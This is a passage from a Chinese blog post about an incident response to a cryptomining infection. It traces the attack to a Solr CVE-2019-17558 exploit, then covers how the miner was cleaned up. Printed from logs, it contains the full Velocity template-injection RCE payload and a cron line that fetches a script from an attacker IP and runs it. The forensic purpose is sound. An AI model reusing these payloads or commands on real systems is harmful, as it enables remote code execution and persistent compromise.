+<h4 id="死路"><a href="#死路" class="headerlink" title="死路"></a>死路</h4><p>于是问下朋友历史用过哪些开源软件，他说开过ssh、http、stmp、redis、docker、solr。如果应急业务的话，一定要问清楚历史开过什么服务，因为有些情况是业务上线那段时间搞进来的，然后你应急时已经下线了。因为他的服务器是4.16号被搞进来的，现在才开始应急，就是属于这种情况。</p>
+<h4 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h4><p>第一种猜测是写恶意文件，这时明显会有脏数据，经过排查ssh密钥、cron计划任务都没有redis脏数据。</p>
+<p>比如ssh密钥会有以下类似脏数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat /root/.ssh/authorized_keys</span><br><span class="line">REDIS0009�    redis-ver5.0.5�</span><br><span class="line">�edis-bits�@�ctime��P_used-mem�h</span><br><span class="line"> aof-preamble���xA�</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">��J�#P��r</span><br></pre></td></tr></table></figure>
+
+
+<p>再看看redis的日志：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/redis/redis.conf</span><br><span class="line"></span><br><span class="line">logfile /var/log/redis/redis-server.log</span><br></pre></td></tr></table></figure>
+<p>发现日志并未开启。如果有日志，也是可以从日志中看出一些痕迹。</p>
+<p>第二种猜测是redis主从同步文件，然后加载so文件执行命令的方式。不过网上公开的脚本执行命令后会进行删除库文件，所以找不到so文件，这里也看不到痕迹。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remote.shell_cmd(f&quot;rm ./&#123;SERVER_EXP_MOD_FILE&#125;&quot;)</span><br></pre></td></tr></table></figure>
+
+
+<p>再看看其他痕迹，下面是使用kali模拟的。<br>看下replicaton记录，发现是有记录的（这种情况询问业务是否主从复制过，没有的话却又有主从复制的痕迹就很可疑了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; info replication</span><br><span class="line"># Replication</span><br><span class="line">role:master</span><br><span class="line">connected_slaves:0</span><br><span class="line">master_replid:a5ef95e174d7d464f3563fd660e5ad8a009bef71</span><br><span class="line">master_replid2:31f5d75bb871a43a2c5813da51212f9fdc31107a</span><br><span class="line">master_repl_offset:0</span><br><span class="line">second_repl_offset:1</span><br><span class="line">repl_backlog_active:0</span><br><span class="line">repl_backlog_size:1048576</span><br><span class="line">repl_backlog_first_byte_offset:0</span><br><span class="line">repl_backlog_histlen:0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>再看看加载module的记录，虽然有MODULE UNLOAD system卸载module，但有时候异常退出时，并不会删除，这时就会有痕迹。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; module list</span><br><span class="line">1) 1) &quot;name&quot;</span><br><span class="line">   2) &quot;system&quot;</span><br><span class="line">   3) &quot;ver&quot;</span><br><span class="line">   4) (integer) 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>还可以查看dbfilename变量，这个脚本在getshell成功后，会把dbfilename改成dump.rdp，所以这里是看不出痕迹。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config get dbfilename</span><br><span class="line">1) &quot;dbfilename&quot;</span><br><span class="line">2) &quot;dump.rdb&quot;</span><br></pre></td></tr></table></figure>
+
+<p>再回过头看朋友的服务器，上面的痕迹都没有，也暂时排除掉redis。</p>
+<h4 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h4><p>docker常见攻击方式是挂载母机的任意目录进行写入恶意文件getshell，这种情况是有命令记录的。</p>
+<p>查看docker的命令记录<br>docker logs -f -t –tail 1000 76587eb08f6a | more</p>
+<p>或者直接进入docker容器里面，查看hostory记录，发现并没有痕迹。也暂时排除掉。</p>
+<h4 id="solr"><a href="#solr" class="headerlink" title="solr"></a>solr</h4><p>就剩下solr没有进行排查了，来到solr日志目录。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:/opt/solr-8.1.1/example/techproducts/logs$ ls</span><br><span class="line">solr-8983-console.log  solr_gc.log.0.current  solr.log  solr.log.1  solr.log.2  solr.log.3  solr.log.4  solr_slow_requests.log</span><br></pre></td></tr></table></figure>
+
+<p>查看下log日志，因为之前有经验，直接寻找exec关键词，或者payload关键词，找到如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">2020-04-21 04:27:02.767 INFO  (qtp1209702763-23) [   x:techproducts] o.a.s.c.S.Request [techproducts]  webapp=/solr path=/select params=&#123;q=1&amp;v.template=custom&amp;v.template.custom=#set($x%3D&#x27;&#x27;)+#set($rt%3D$x.class.forName(&#x27;java.lang.Runtime&#x27;))+#set($chr%3D$x.class.forName(&#x27;java.lang.Character&#x27;))+#set($str%3D$x.class.forName(&#x27;java.lang.String&#x27;))+#set($ex%3D$rt.getRuntime().exec(&#x27;/tmp/zzz&#x27;))+$ex.waitFor()+#set($out%3D$ex.getInputStream())+#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end&amp;wt=velocity&#125; hits=1 status=0 QTime=0</span><br><span class="line">2020-04-21 04:27:02.846 ERROR (qtp1209702763-23) [   x:techproducts] o.a.s.s.HttpSolrCall null:org.apache.velocity.exception.MethodInvocationException: Invocation of method &#x27;exec&#x27; in  class java.lang.Runtime threw exception java.io.IOException: Cannot run program &quot;/tmp/zzz&quot;: error=2, No such file or directory at custom.vm[line 1, column 186]</span><br><span class="line">    at org.apache.velocity.runtime.parser.node.ASTMethod.handleInvocationException(ASTMethod.java:280)</span><br><span class="line">    ..........................</span><br><span class="line">    at java.lang.Thread.run(Thread.java:748)</span><br><span class="line">Caused by: java.io.IOException: Cannot run program &quot;/tmp/zzz&quot;: error=2, No such file or directory</span><br><span class="line">    at java.lang.ProcessBuilder.start(ProcessBuilder.java:1048)</span><br><span class="line">    at java.lang.Runtime.exec(Runtime.java:621)</span><br><span class="line">    ..........................</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>发现是使用CVE-2019-17558的payload，在2020-04-21进行攻击的，时间吻合上了，还有zzz这个历史遗留痕迹在这日志中体现了，并且他说solr使用-force参数使用root权限启动的，这样就实锤了。</p>
+<p>其实这种挖矿的一般都会自带横向攻击的，拿下分析一下就好，可是195.3.146.118挂了，而且是s.sh是不落地的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ubuntu# curl http://195.3.146.118/s.sh</span><br><span class="line">curl: (7) Failed to connect to 195.3.146.118 port 80: Connection refused</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="清理"><a href="#清理" class="headerlink" title="清理"></a>清理</h1><h4 id="业务处理"><a href="#业务处理" class="headerlink" title="业务处理"></a>业务处理</h4><p>solr是已下线，所以暂时不需要处理，建议他后续使用solr的话务必使用最新版本并且不对公网开放。</p>
+<h4 id="处理账号"><a href="#处理账号" class="headerlink" title="处理账号"></a>处理账号</h4><p>查看/etc/passwd，发现没有新增恶意账号，建议他修改账号密码，避免黑客已拖走密码文件暴力破解出密码。</p>
+<h4 id="搜索运行代码文件"><a href="#搜索运行代码文件" class="headerlink" title="搜索运行代码文件"></a>搜索运行代码文件</h4><p>通过文件描述符和文件类型确认正在运行的文件。</p>
+<p>文件描述符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cwd – Current Working Directory</span><br><span class="line">txt – Text file</span><br><span class="line">mem – Memory mapped file</span><br><span class="line">mmap – Memory mapped device</span><br><span class="line">NUMBER – Represent the actual file descriptor. The character after the number i.e ‘1u’, represents the mode in which the file is opened. r for read, w for write, u for read and write.</span><br><span class="line">rtd：root directory;</span><br><span class="line">lnn：library references (AIX);</span><br><span class="line">er：FD information error (see NAME column);</span><br><span class="line">jld：jail directory (FreeBSD);</span><br><span class="line">ltx：shared library text (code and data);</span><br><span class="line">mxx ：hex memory-mapped type number xx.</span><br><span class="line">m86：DOS Merge mapped file;</span><br><span class="line">mem：memory-mapped file;</span><br><span class="line">mmap：memory-mapped device;</span><br><span class="line">pd：parent directory;</span><br><span class="line">tr：kernel trace file (OpenBSD);</span><br><span class="line">v86  VP/ix mapped file;</span><br></pre></td></tr></table></figure>
+
+
+<p>文件类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">REG – Regular File</span><br><span class="line">DIR – Directory</span><br><span class="line">FIFO – First In First Out</span><br><span class="line">CHR – Character special file</span><br><span class="line">BLK：块设备类型</span><br><span class="line">UNIX： UNIX 域套接字</span><br><span class="line">IPv4：网际协议 (IP) 套接字</span><br></pre></td></tr></table></figure>
+
+
+<p>查看进程程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof | grep txt  | awk -F &quot; &quot;  &#x27;&#123;print $NF&#125;&#x27; | xargs ls -al -tr</span><br></pre></td></tr></table></figure>
+
+<p>再检测一下so文件，以下面特征来定位系统加载的so。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD   TYPE DEVICE</span><br><span class="line">mem    REG              253,1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ubuntu# lsof | grep &quot;mem&quot; | grep &quot;253,1&quot; | grep REG | awk -F &quot; &quot; &#x27;&#123;print $NF&#125;</span><br><span class="line">-rw-r--r-- 1 root root   316768 Oct 11  2019 /usr/lib/sudo/sudoers.so</span><br><span class="line">-rw-r--r-- 1 root root    80304 Oct 11  2019 /usr/lib/sudo/libsudo_util.so.0.0.0</span><br><span class="line">-rw------- 1 root root    16384 Feb  5 12:32 /var/lib/docker/builder/fscache.db</span><br><span class="line">-rw------- 1 root root    32768 Jul 13 23:47 /var/lib/docker/volumes/metadata.db</span><br><span class="line">-rw------- 1 root root    32768 Jul 13 23:47 /var/lib/docker/buildkit/cache.db</span><br><span class="line">-rw-r--r-- 1 root root   131072 Jul 15 22:43 /var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db</span><br></pre></td></tr></table></figure>
+
+
+<p>从时间上来看，并没有替换系统文件之类的。</p>
+<p>服务-进程守护</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# service --status-all</span><br><span class="line"> [ + ]  acpid</span><br><span class="line"> [ + ]  apache-htcacheclean</span><br><span class="line"> [ + ]  apache2</span><br><span class="line"> [ - ]  apparmor</span><br><span class="line"> [ + ]  apport</span><br><span class="line"> [ + ]  atd</span><br><span class="line"> [ - ]  bootmisc.sh</span><br><span class="line"> [ - ]  cgroupfs-mount</span><br><span class="line"> [ - ]  checkfs.sh</span><br><span class="line"> [ - ]  checkroot-bootclean.sh</span><br><span class="line"> [ - ]  checkroot.sh</span><br><span class="line"> [ + ]  console-setup</span><br><span class="line"> [ + ]  cron</span><br><span class="line"> [ - ]  cryptdisks</span><br><span class="line"> [ - ]  cryptdisks-early</span><br><span class="line"> [ + ]  dbus</span><br><span class="line"> [ + ]  docker</span><br><span class="line"> [ + ]  grub-common</span><br><span class="line"> [ - ]  hostname.sh</span><br><span class="line"> [ - ]  hwclock.sh</span><br><span class="line"> [ - ]  irqbalance</span><br><span class="line"> [ + ]  iscsid</span><br><span class="line"> [ + ]  kdump-tools</span><br><span class="line"> [ + ]  kexec</span><br><span class="line"> [ + ]  kexec-load</span><br><span class="line"> [ - ]  keyboard-setup.dpkg-bak</span><br><span class="line"> [ - ]  killprocs</span><br><span class="line"> [ + ]  kmod</span><br><span class="line"> [ - ]  lvm2</span><br><span class="line"> [ + ]  lvm2-lvmetad</span><br><span class="line"> [ + ]  lvm2-lvmpolld</span><br><span class="line"> [ + ]  lxcfs</span><br><span class="line"> [ - ]  lxd</span><br><span class="line"> [ + ]  mdadm</span><br><span class="line"> [ - ]  mdadm-waitidle</span><br><span class="line"> [ - ]  mountall-bootclean.sh</span><br><span class="line"> [ - ]  mountall.sh</span><br><span class="line"> [ - ]  mountdevsubfs.sh</span><br><span class="line"> [ - ]  mountkernfs.sh</span><br><span class="line"> [ - ]  mountnfs-bootclean.sh</span><br><span class="line"> [ - ]  mountnfs.sh</span><br><span class="line"> [ - ]  mysql</span><br><span class="line"> [ + ]  networking</span><br><span class="line"> [ + ]  ntp</span><br><span class="line"> [ + ]  ondemand</span><br><span class="line"> [ + ]  open-iscsi</span><br><span class="line"> [ - ]  open-vm-tools</span><br><span class="line"> [ + ]  php5.6-fpm</span><br><span class="line"> [ + ]  php7.3-fpm</span><br><span class="line"> [ - ]  plymouth</span><br><span class="line"> [ - ]  plymouth-log</span><br><span class="line"> [ + ]  postfix</span><br><span class="line"> [ + ]  procps</span><br><span class="line"> [ + ]  rc.local</span><br><span class="line"> [ + ]  resolvconf</span><br><span class="line"> [ - ]  rsync</span><br><span class="line"> [ + ]  rsyslog</span><br><span class="line"> [ - ]  screen-cleanup</span><br><span class="line"> [ - ]  sendsigs</span><br><span class="line"> [ + ]  ssh</span><br><span class="line"> [ + ]  ubuntu-fan</span><br><span class="line"> [ + ]  udev</span><br><span class="line"> [ + ]  ufw</span><br><span class="line"> [ - ]  umountfs</span><br><span class="line"> [ - ]  umountnfs.sh</span><br><span class="line"> [ - ]  umountroot</span><br><span class="line"> [ + ]  unattended-upgrades</span><br><span class="line"> [ + ]  urandom</span><br><span class="line"> [ - ]  uuidd</span><br><span class="line"> [ - ]  uwsgi</span><br><span class="line"> [ - ]  x11-common</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ubuntu# service --status-all | grep + | awk -F &#x27;  &#x27; &#x27;&#123;print $2&#125;&#x27; | xargs -I &#123;&#125; service &#123;&#125; status  | grep -Po  &quot;/.*?(?=;)&quot; | xargs ls -al -tr</span><br><span class="line">-rw-r--r-- 1 root root  241 Mar  3  2015 /lib/systemd/system/ufw.service</span><br><span class="line">-rwxr-xr-x 1 root root 1581 Oct 16  2015 /etc/init.d/ondemand</span><br><span class="line">-rw-r--r-- 1 root root  169 Jan 15  2016 /lib/systemd/system/atd.service</span><br><span class="line">-rwxr-xr-x 1 root root 1105 Mar 16  2016 /etc/init.d/grub-common</span><br><span class="line">-rw-r--r-- 1 root root  290 Apr  5  2016 /lib/systemd/system/rsyslog.service</span><br><span class="line">-rw-r--r-- 1 root root  251 Apr  6  2016 /lib/systemd/system/cron.service</span><br><span class="line">-rw-r--r-- 1 root root  234 Apr  9  2016 /lib/systemd/system/acpid.service</span><br><span class="line">-rw-r--r-- 1 root root  335 Apr 16  2016 /lib/systemd/system/lvm2-lvmpolld.service</span><br><span class="line">-rw-r--r-- 1 root root  380 Apr 16  2016 /lib/systemd/system/lvm2-lvmetad.service</span><br><span class="line">-rw-r--r-- 1 root root  288 Jun 16  2016 /lib/systemd/system/console-setup.service</span><br><span class="line">-rw-r--r-- 1 root root  259 Oct 28  2016 /lib/systemd/system/ubuntu-fan.service</span><br><span class="line">-rw-r--r-- 1 root root  735 Dec  1  2016 /lib/systemd/system/networking.service</span><br><span class="line">-rw-r--r-- 1 root root  491 Jan 13  2017 /lib/systemd/system/dbus.service</span><br><span class="line">-rw-r--r-- 1 root root  345 Apr 20  2017 /lib/systemd/system/unattended-upgrades.service</span><br><span class="line">-rwxr-xr-x 1 root root 2365 Oct  9  2017 /etc/init.d/mdadm</span><br><span class="line">-rw-r--r-- 1 root root  311 Nov  9  2017 /lib/systemd/system/lxcfs.service</span><br><span class="line">-rw-r--r-- 1 root root  420 Nov 30  2017 /lib/systemd/system/resolvconf.service</span><br><span class="line">-rwxr-xr-x 1 root root 7972 Jan 18  2018 /etc/init.d/postfix</span><br><span class="line">-rw-r--r-- 1 root root  340 Feb  6  2018 /lib/systemd/system/kdump-tools.service</span><br><span class="line">-rwxr-xr-x 1 root root 1560 Feb 14  2018 /etc/init.d/ntp</span><br><span class="line">-rwxr-xr-x 1 root root 3323 Feb 21  2018 /etc/init.d/kexec-load</span><br><span class="line">-rwxr-xr-x 1 root root 1121 Feb 21  2018 /etc/init.d/kexec</span><br><span class="line">-rw-r--r-- 1 root root  635 Mar 16  2018 /etc/systemd/system/rc-local.service</span><br><span class="line">-rwxr-xr-x 1 root root 2802 May 24  2018 /etc/init.d/apport</span><br><span class="line">-rwxr-xr-x 1 root root 2210 Jun 11  2018 /etc/init.d/apache-htcacheclean</span><br><span class="line">-rwxr-xr-x 1 root root 8087 Jun 11  2018 /etc/init.d/apache2</span><br><span class="line">-rw-r--r-- 1 root root 1068 Aug  3  2018 /lib/systemd/system/open-iscsi.service</span><br><span class="line">-rw-r--r-- 1 root root  455 Aug  3  2018 /lib/systemd/system/iscsid.service</span><br><span class="line">-rw-r--r-- 1 root root  445 Aug 22  2018 /lib/systemd/system/ssh.service</span><br><span class="line">-rw-r--r-- 1 root root  825 Jan 11  2019 /lib/systemd/system/systemd-udevd.service</span><br><span class="line">-rw-r--r-- 1 root root  653 Jan 11  2019 /lib/systemd/system/systemd-sysctl.service</span><br><span class="line">-rw-r--r-- 1 root root  717 Jan 11  2019 /lib/systemd/system/systemd-random-seed.service</span><br><span class="line">-rw-r--r-- 1 root root  967 Jan 11  2019 /lib/systemd/system/systemd-modules-load.service</span><br><span class="line">-rw-r--r-- 1 root root  326 Sep  2  2019 /lib/systemd/system/php5.6-fpm.service</span><br><span class="line">-rw-r--r-- 1 root root  326 Oct  8  2019 /lib/systemd/system/php7.3-fpm.service</span><br><span class="line">-rw-r--r-- 1 root root 1735 Feb  5 12:57 /lib/systemd/system/docker.service</span><br></pre></td></tr></table></figure>
+
+
+<p>也并无异常，再看看计划任务的情况，发现有通过cron进行权限维持。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ubuntu# crontab -l</span><br><span class="line">*/1 * * * * /usr/local/safe//start.sh &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">0 0 * * * /usr/local/safe//SafeCrontab.sh &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">* * * * * wget -q -O - http://195.3.146.118/s.sh | sh &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>再查看下cron具体的情况。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ubuntu# service cron status</span><br><span class="line">● cron.service - Regular background program processing daemon</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)</span><br><span class="line">   Active: active (running) since Sat 2020-04-18 22:16:06 CST; 2 months 22 days ago</span><br><span class="line">     Docs: man:cron(8)</span><br><span class="line"> Main PID: 1225 (cron)</span><br><span class="line">   CGroup: /system.slice/cron.service</span><br><span class="line">           ├─ 1225 /usr/sbin/cron -f</span><br><span class="line">           ├─ 2109 /usr/local/safe//agent -d</span><br><span class="line">           ├─ 2122 barad_agent                                </span><br><span class="line">           ├─ 2123 barad_agent                                </span><br><span class="line">           ├─ 2124 barad_agent                                </span><br><span class="line">           ├─25447 /var/tmp/kinsing</span><br><span class="line">           └─25478 /tmp/kdevtmpfsi</span><br><span class="line"></span><br><span class="line">Jul 11 00:54:41 ubuntu CRON[17243]: pam_unix(cron:session): session closed for user root</span><br><span class="line">Jul 11 00:54:41 ubuntu CRON[16998]: pam_unix(cron:session): session closed for user root</span><br><span class="line">Jul 11 00:54:41 ubuntu CRON[17406]: pam_unix(cron:session): session closed for user root</span><br><span class="line">Jul 11 00:54:41 ubuntu CRON[18192]: pam_unix(cron:session): session closed for user root</span><br><span class="line">Jul 11 00:55:01 ubuntu CRON[19704]: pam_unix(cron:session): session opened for user root by (uid=0)</span><br><span class="line">Jul 11 00:55:01 ubuntu CRON[19703]: pam_unix(cron:session): session opened for user root by (uid=0)</span><br><span class="line">Jul 11 00:55:01 ubuntu CRON[19705]: (root) CMD (/usr/local/safe//start.sh &gt; /dev/null 2&gt;&amp;1 &amp;)</span><br><span class="line">Jul 11 00:55:01 ubuntu CRON[19706]: (root) CMD (wget -q -O - http://195.3.146.118/s.sh | sh &gt; /dev/null 2&gt;&amp;1)</span><br><span class="line">Jul 11 00:55:01 ubuntu CRON[19704]: pam_unix(cron:session): session closed for user root</span><br><span class="line">Jul 11 00:55:03 ubuntu CRON[19703]: pam_unix(cron:session): session closed for user root</span><br></pre></td></tr></table></figure>
+
+<p>cron 派生出来的进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CGroup: /system.slice/cron.service</span><br><span class="line">        ├─ 1225 /usr/sbin/cron -f</span><br><span class="line">        ├─ 2109 /usr/local/safe//agent -d</span><br><span class="line">        ├─ 2122 barad_agent                                </span><br><span class="line">        ├─ 2123 barad_agent                                </span><br><span class="line">        ├─ 2124 barad_agent                                </span><br><span class="line">        ├─25447 /var/tmp/kinsing</span><br><span class="line">        └─25478 /tmp/kdevtmpfsi</span><br></pre></td></tr></table></figure>
+
+
+<p>可以看到cron 执行的命令记录，还有一些关闭进程的信息之类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Jul 11 00:55:01 ubuntu CRON[19705]: (root) CMD (/usr/local/safe//start.sh &gt; /dev/null 2&gt;&amp;1 &amp;)</span><br></pre></td></tr></table></figure>
+
+
+<p>最终干掉这两个恶意进程和删除cron任务<br>├─17951 /var/tmp/kinsing<br>└─25478 /tmp/kdevtmpfsi</p>
+<p>凉个24小时，发现没再出现挖矿程序，这次挖矿应急就结束了。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>2020.4.16 挖矿木马通过solr的CVE-2019-17558漏洞攻击进来，并进行挖矿。<br>2020.7.20 开始调查，发现通过kdevtmpfsi挖矿，发现通过cron维持权限。<br>2020.7.21 查看系统情况，没其他异常出现，确认挖矿木马被清理完毕。</p>
+<p>整个过程还是比较简单，从特征开始，就是cpu占满这种非常明显的特征（有的只有dns流量传出来，其他一切正常），然后日志基本没有清理(有些直接删除，有些进行伪造)，最后维持权限的手段比较明显（我以前遇到隐藏shell文件，但是你直接用各种工具扫是扫不出，但是每次能给你挂菠菜信息）。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/peida/archive/2013/02/26/2932972.html">每天一个linux命令（51）：lsof命令</a></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://lufe1.cn/2020/07/28/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/" title="一次应急挖矿木马" target="_blank" rel="external">https://lufe1.cn/2020/07/28/一次应急挖矿木马/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
